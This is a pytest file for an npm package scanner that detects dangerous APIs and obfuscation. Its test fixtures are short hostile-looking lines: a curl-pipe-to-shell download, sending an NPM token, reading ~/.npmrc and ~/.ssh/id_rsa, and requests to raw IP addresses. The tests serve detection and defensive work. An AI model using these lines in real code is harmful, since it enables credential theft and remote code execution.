import pytest

from intanalyze.rules.obfuscation import (
    dangerous_signals,
    new_dangerous_signals,
    obfuscation_signals,
    scan,
    shannon_entropy,
)


def _names(signals):
    return {s.name for s in signals}


@pytest.mark.parametrize(
    ("code", "name"),
    [
        ("eval(x)", "eval"),
        ("const f = new Function('return 1')", "new-function"),
        ("require('child_process')", "child_process"),
        ("exec('ls')", "exec"),
        ("cp.execSync('ls')", "exec"),
        ("spawn('sh', [])", "spawn"),
        ("require('net')", "raw-socket"),
        ("import dns from 'node:dns'", "raw-socket"),
        ("fetch('http://203.0.113.7/x')", "raw-ip-request"),
        ("https.request({host: '198.51.100.2'})", "raw-ip-request"),
        ("send(process.env.NPM_TOKEN)", "env-harvest"),
        ("JSON.stringify(process.env)", "env-harvest"),
        ("fs.readFileSync(home + '/.npmrc')", "credential-files"),
        ("read('~/.ssh/id_rsa')", "credential-files"),
        ("const c = 'curl -s http://x | sh'", "shell-download"),
    ],
)
def test_dangerous_apis(code, name):
    assert name in _names(dangerous_signals(code))


@pytest.mark.parametrize(
    "code",
    [
        "/re/.exec(str)",
        "const env = process.env.NODE_ENV",
        "fetch('http://127.0.0.1:3000')",
        "evaluate(x)",
        "// a comment about curling",
    ],
)
def test_benign_code_is_not_dangerous(code):
    assert dangerous_signals(code) == []


def test_signal_evidence_has_line_numbers():
    (sig,) = dangerous_signals("ok\nok\neval(1)")
    assert sig.line == 3 and sig.evidence().startswith("line 3: eval() call")


def test_entropy():
    assert shannon_entropy("") == 0.0
    assert shannon_entropy("aaaa") == 0.0
    assert shannon_entropy("ab") == 1.0


def test_obfuscation_signals():
    text = (
        "var a = '" + "\\x41" * 40 + "';\n"
        + "var b = '" + "ab12" * 60 + "';\n"
        + "var c = '" + "QUJD" * 60 + "Zz';\n"
        + "String.fromCharCode(1,2,3,4,5,6,7,8,9)\n"
        + "x" * 1200 + "\n"
    )
    assert _names(obfuscation_signals(text)) >= {
        "hex-escapes", "hex-blob", "base64-blob", "fromcharcode", "long-line",
    }


def test_high_entropy_file():
    import random

    rng = random.Random(0)
    chars = [chr(c) for c in range(33, 127)]
    text = "".join(rng.choice(chars) for _ in range(4000))
    assert "entropy" in _names(obfuscation_signals(text))


def test_minified_ok_and_data_files_skip_noisy_checks():
    long_line = "a=b+1;" * 300
    assert obfuscation_signals(long_line, minified_ok=True) == []
    assert obfuscation_signals(long_line, path="data.json") == []
    sourcemap = "//# sourceMappingURL=data:application/json;base64," + "A" * 500
    assert obfuscation_signals(sourcemap) == []


def test_ordinary_code_is_clean():
    code = "function add(a, b) {\n  return a + b;\n}\nmodule.exports = { add };\n" * 20
    assert scan(code, path="index.js") == []


def test_new_dangerous_signals_counts_per_api():
    assert _names(new_dangerous_signals("eval(a)\neval(b)", "eval(a)")) == {"eval"}
    assert new_dangerous_signals("eval(a)", "eval(a)") == []
    assert _names(new_dangerous_signals("eval(a)", None)) == {"eval"}
